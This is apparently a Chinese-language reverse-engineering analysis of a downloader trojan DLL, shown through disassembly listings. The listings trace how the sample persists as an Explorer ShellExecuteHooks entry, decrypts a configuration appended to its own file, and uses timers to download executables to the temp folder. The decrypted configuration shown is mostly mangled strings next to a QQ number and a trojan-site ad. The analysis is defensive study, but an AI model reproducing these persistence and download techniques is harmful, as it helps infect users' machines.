
0012FF38  `0093026C`  |Subkey = `"CLSID\{F630F902-0922-45C8-B820-C8AF4C610C28}\InProcServer32"`

`/*`

0040405C  |.  `E8` `33FDFFFF`   call    `<jmp.&advapi32.RegCreateKeyExA>`   ; `\RegCreateKeyExA`

`/*`

buffer:

004043C4  Apartment

`*/`

00404073  |.  `E8` `24FDFFFF`   call    `<jmp.&advapi32.RegSetValueExA>`    ; `\RegSetValueExA`

退出。

作者：nbw 4 NE365 。近来总有人修改版权，没办法，只好在中间插个广告了。   继续看。

下面分析`InfoMs.dlt`

由于上面将该`DLL`注册为`ShellExecuteHooks`项，所以该`DLL`会被`explorer`加载。

这里判断加载该`DLL`的是否为`Explorer`

```
//String1 = "LOADDLL.EXE"

//String2 = "Explorer.Exe"
```

00785738        |.  `E8` `ABECF>`call `<jmp.&kernel32.lstrcmpiA>`                        ; `\lstrcmpiA`

如果不是则退出。

//从文件末尾读取配置文件

00784634        |.  `E8` `47FDF>`call `<jmp.&kernel32.CreateFileA>`                      ; `\CreateFileA`

0078464B        |.  `E8` `88FDF>`call `<jmp.&kernel32.SetFilePointer>`                   ; `\SetFilePointer`

0078465A        |.  `E8` `69FDF>`call `<jmp.&kernel32.ReadFile>`                         ; `\ReadFile`

0078467F        |.  `E8` `54FDF>`call `<jmp.&kernel32.SetFilePointer>`                   ; `\SetFilePointer`

007846A1        |.  `E8` `22FDF>`call `<jmp.&kernel32.ReadFile>`                         ; `\ReadFile`

//将配置信息解密

00784554        |> `/8A93` `C46>`/mov dl,byte ptr ds:[ebx+7860C4]

0078455A        |. |`8B0C24`   |mov ecx,dword ptr ss:[esp]

0078455D        |. |`3011`     |xor byte ptr ds:[ecx],dl

0078455F        |. |`FF0424`   |inc dword ptr ss:[esp]

00784562        |. |`43`       |inc ebx

00784563        |. |`81E3` `070>`|and ebx,80000007

00784569        |. |`79` `05`    |jns short InfoMs.00784570

0078456B        |. |`4B`       |dec ebx

0078456C        |. |`83CB` `F8`  |or ebx,FFFFFFF8

0078456F        |. |`43`       |inc ebx

00784570        |> |`48`       |dec eax

00784571        |.^\`75` `E1`    \jnz short InfoMs.00784554

得到：

00BA0050  DownHeader..d58K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3#2Q4x3V1j5I4i4K6u0W2k6i4S2W2i4K6u0W2i4K6u0W2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3@1`.

00BA0090  /2.exe..238K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3#2Q4x3V1j5K6i4K6u0W2k6i4S2W2i4K6u0W2i4K6u0W2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3#2Q4x3V1j5@1i4K6u0W2k6b7`.`.

00BA00D0  xe..120K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3#2Q4x3V1j5#2i4K6u0W2k6i4S2W2i4K6u0W2i4K6u0W2K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3#2Q4x3V1j5$3i4K6u0W2k6i4S2W2i4K6u0W2i4K6u0W2

00BA0110  28cK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3#2Q4x3V1j5%4i4K6u0W2k6i4S2W2i4K6u0W2i4K6u0W2i4@1f1@1i4@1u0p5i4K6W2o6i4@1f1^5i4K6R3H3i4K6R3#2i4@1g2r3i4@1u0o6i4K6W2m8f1X3!0T1b7X3g2J5 QQ：3035777..欢迎访问

00BA0150  木马基地 6c4K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6f1S2S2j5$3D9I4y4U0W2Q4x3X3g2U0L8$3#2Q4x3X3g2Q4x3X3g2Q4x3o6u0Q4x3U0c8Q4x3V1y4Q4x3V1y4Q4x3X3g2Q4x3X3g2Q4x3X3g2Q4x3X3f1`.

也就是开始我们设置的下载信息等。

下面解析上面的这个结构，具体略。

007857A6        |.  `68` `08587>`push InfoMs.00785808                                  ; /Title = "yundao"

007857AB        |.  `68` `10587>`push InfoMs.00785810                                  ; |Class = "ScrollBar"

007857B0        |.  `E8` `4BECF>`call `<jmp.&user32.FindWindowA>`                        ; \FindWindowA

//启动了一个线程

007857B9        |.  `68` `D0777>`push InfoMs.007877D0                                  ; /pThreadId = InfoMs.007877D0

007857BE        |.  `6A` `00`    push 0                                                ; |CreationFlags = 0

007857C0        |.  `6A` `42`    push 42                                               ; |pThreadParm = 00000042

007857C2        |.  `68` `F4537>`push InfoMs.007853F4                                  ; |ThreadFunction = InfoMs.007853F4

007857C7        |.  `6A` `00`    push 0                                                ; |StackSize = 0

007857C9        |.  `6A` `00`    push 0                                                ; |pSecurity = NULL

007857CB        |.  `E8` `C0EBF>`call `<jmp.&kernel32.CreateThread>`                     ; \CreateThread

下面研究一下这个线程：

007853FB        |.  `68` `94547>`push InfoMs.00785494                                  ; /Title = "yundao"

00785400        |.  `68` `9C547>`push InfoMs.0078549C                                  ; |Class = "ScrollBar"

00785405        |.  `E8` `F6EFF>`call `<jmp.&user32.FindWindowA>`                        ; \FindWindowA

0078448C        |.  `50`       push eax                                              ; |WindowName

0078448D        |.  `57`       push edi                                              ; |Class

0078448E        |.  `56`       push esi                                              ; |ExtStyle

0078448F        |.  `E8` `B4FFF>`call `<jmp.&user32.CreateWindowExA>`                    ; \CreateWindowExA

//"C:\Program Files\Common Files\Microsoft Shared\MSInfo\InfoMs.dlt"

00785420        |.  `E8` `9BEFF>`call `<jmp.&kernel32.LoadLibraryA>`                     ; \LoadLibraryA

//这里设置了一个时间事件

00785156        |> \`68` `2C517>`push InfoMs.0078512C                                  ; /Timerproc = InfoMs.0078512C

0078515B        |.  `68` `E0930>`push 493E0                                            ; |Timeout = 300000. ms

00785160        |.  `6A` `00`    push 0                                                ; |TimerID = 0

00785162        |.  `6A` `00`    push 0                                                ; |hWnd = NULL

00785164        |.  `E8` `BFF2F>`call `<jmp.&user32.SetTimer>`                           ; \SetTimer

//又设置了一个时间事件2

00785382        |> \`68` `60537>`push InfoMs.00785360                                  ; /Timerproc = InfoMs.00785360

00785387        |.  `68` `C0270>`push 927C0                                            ; |Timeout = 600000. ms

0078538C        |.  `6A` `00`    push 0                                                ; |TimerID = 0

0078538E        |.  `6A` `00`    push 0                                                ; |hWnd = NULL

00785390        |.  `E8` `93F0F>`call `<jmp.&user32.SetTimer>`                           ; \SetTimer

//进入自身消息循环

00785458        |> `/8D45` `E4`  /lea eax,dword ptr ss:[ebp-1C]

0078545B        |. |`50`       |push eax                                             ; /pMsg

0078545C        |. |`E8` `97EFF>`|call `<jmp.&user32.DispatchMessageA>`                  ; \DispatchMessageA

00785461        |> |`6A` `00`     push 0                                               ; /MsgFilterMax = 0

00785463        |. |`6A` `00`    |push 0                                               ; |MsgFilterMin = 0

00785465        |. |`6A` `00`    |push 0                                               ; |hWnd = NULL

00785467        |. |`8D45` `E4`  |lea eax,dword ptr ss:[ebp-1C]                        ; |

0078546A        |. |`50`       |push eax                                             ; |pMsg

0078546B        |. |`E8` `98EFF>`|call `<jmp.&user32.GetMessageA>`                       ; \GetMessageA

00785470        |. |`85C0`     |test eax,eax

00785472        |.^\`75` `E4`    \jnz short InfoMs.00785458

我们看一下上面的2个时间事件。

事件1：

既然是下载者，就要从网上下载东西下来，下载的东西就是开始设置的。这个时间事件就处理这个东西。

00784AA4            |> `/8B07`     /mov eax,dword ptr ds:[edi]

00784AA6            |. |`833C98` `0>`|cmp dword ptr ds:[eax+ebx\*4],0

00784AAA            |. |`74` `18`    |je short InfoMs.00784AC4

00784AAC            |. |`8B07`     |mov eax,dword ptr ds:[edi]

00784AAE            |. |`8B0498`   |mov eax,dword ptr ds:[eax+ebx\*4]

00784AB1            |. |`E8` `C6FEF>`|call InfoMs.0078497C

00784AB6            |. |`85C0`     |test eax,eax

00784AB8            |. |`74` `0A`    |je short InfoMs.00784AC4

00784ABA            |. |`8B07`     |mov eax,dword ptr ds:[edi]

00784ABC            |. |`8D0498`   |lea eax,dword ptr ds:[eax+ebx\*4]

00784ABF            |. |`E8` `14E9F>`|call InfoMs.007833D8

00784AC4            |> |`43`       |inc ebx

00784AC5            |. |`4E`       |dec esi

00784AC6            |.^\`75` `DC`    \jnz short InfoMs.00784AA4

具体：

00784B93            |.  `E8` `20F8F>`call `<jmp.&kernel32.GetTempPathA>`                     ; \GetTempPathA
